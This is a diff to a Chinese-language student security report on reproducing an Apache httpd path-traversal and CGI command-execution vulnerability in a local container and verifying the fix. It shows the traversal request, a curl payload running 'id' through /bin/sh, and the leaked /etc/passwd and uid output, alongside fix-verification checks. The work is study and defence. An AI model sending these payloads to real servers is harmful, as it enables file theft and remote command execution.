@@ -376,13 +376,20 @@ curl --path-as-is --data 'echo;id' \
   'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
 ```
 
-预期输出（漏洞环境）：
+**实测输出**（2026-10-19，容器内执行，完整转录见 `cve/evidence/vulnerable.txt`）：
 
 ```
+2. Path traversal: GET /icons/.%2e/../../../../etc/passwd
+HTTP 200
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...
+>>> VULNERABLE: /etc/passwd was disclosed.
+
+3. RCE: POST /cgi-bin/.%2e/../../../../bin/sh
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
+>>> VULNERABLE: command execution confirmed.
 ```
 
 > `--path-as-is` 是关键：不加它，curl 会先把 `/icons/.%2e/../` 归一化掉，
@@ -467,7 +474,7 @@ powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
 
 ```
 [PASS] home page still returns 200                     <- 功能未受损
-[PASS] traversal answered with 404/403
+[PASS] traversal rejected with 400/403/404
 [PASS] no /etc/passwd content in the body
 [PASS] no uid= in the response
 [PASS] no leak for /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname
@@ -477,12 +484,18 @@ powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
 RESULT: fix verified -- all checks passed.
 ```
 
+实测状态码值得单独记一笔：2.4.51 对 `/icons/.%2e/...`、`/cgi-bin/.%2e/...`、`/.%2e/...`
+这些**在规范化阶段就能判定越界**的路径直接返回 **400 Bad Request**（不是 404）；
+只有带编码斜杠的 `/icons/..%2f..%2f..%2f..%2fetc%2fpasswd` 走到 404。
+两种都是拒绝，但报告里写的是实际看到的数——这也是我把断言从"必须是 404"放宽到
+"400/403/404 皆可，且不得含文件内容"的原因。
+
 只修公告里那一个字符串等于做黑名单，2.4.50 的教训就在眼前；因此验证必须覆盖变体。
 
 > ⬜ **待补截图**：`docs/screenshots/cve-fixed.png`
-> （修复后同一命令返回 404，以及 `verify-fix` 的 PASS 汇总）
+> （修复后同一命令返回 400，以及 `verify-fix` 的 PASS 汇总）
 
-![修复验证：同一请求返回 404，verify-fix 全部 PASS](screenshots/cve-fixed.png)
+![修复验证：同一请求返回 400，verify-fix 全部 PASS](screenshots/cve-fixed.png)
 
 ### 4.6 纵深防御建议
 
@@ -513,7 +526,7 @@ RESULT: fix verified -- all checks passed.
 1. 一个“能用”的 API 与一个“安全”的 API 差别不在功能，而在**每个信任边界上的一次决策**：
    参数绑定、输出编码、令牌验签、错误信息收敛。
 2. 安全测试必须可回归：84 个用例里有 24 个专门用来打自己，改坏了 CI 立刻变红。
-3. CVE 复现的价值在于**建立因果链**：一行 `%2e` → 一个函数的顺序错误 → 一次 404 与一次
+3. CVE 复现的价值在于**建立因果链**：一行 `%2e` → 一个函数的顺序错误 → 一次 400 与一次
    `root:x:0:0`。看懂这条链，才谈得上写出补丁和写出检测规则。
 4. 修复要以“同一配置、只变版本”的方式验证，并同时做回归测试；否则你无法区分
    “修好了”和“被我关掉了”。
@@ -615,5 +628,5 @@ RS256 则用私钥签、公钥验），同时校验 `iss`/`aud`/`exp`/`nbf` 与�
 - [ ] `docs/screenshots/bandit.png` — Bandit Job Summary
 - [ ] `docs/screenshots/pip-audit.png` — pip-audit Job Summary
 - [ ] `docs/screenshots/cve-exploit.png` — 漏洞环境 `/etc/passwd` + `id`
-- [ ] `docs/screenshots/cve-fixed.png` — 修复后 404 + verify-fix PASS
+- [ ] `docs/screenshots/cve-fixed.png` — 修复后 400 + verify-fix PASS
 - [ ] 首页按手册要求补齐：编号、题目、变体号、姓名、HDU 号
